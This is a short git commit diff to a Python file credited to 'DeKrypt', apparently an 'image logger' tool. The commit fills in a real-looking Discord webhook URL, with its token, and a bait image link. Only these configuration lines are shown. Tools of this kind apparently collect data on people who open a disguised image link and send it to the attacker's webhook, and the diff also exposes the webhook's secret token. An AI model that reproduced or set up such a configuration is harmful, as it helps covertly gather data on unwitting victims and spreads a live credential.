b107b968b3fdb60d1fd2ca11fb201e17630eba76
lordcomand998-collab <lordcomand998@gmail.com>
2025-11-30 16:10:40 +0200

    hi.py

--- api/hi.py
+++ api/hi.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1444689234387537930/XrU6twfk9pGnF-6xdJvSh9i5e9wq1CsXxAbLqf3BSi7AkuHzxf47YF7WXOnICCEAE1B8 !",
+    "image": "https://tse2.mm.bing.net/th/id/OIP.pl9Wfi3pW3tqDxmQulpZJQHaEl?rs=1&pid=ImgDetMain&o=7&rm=3 !", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
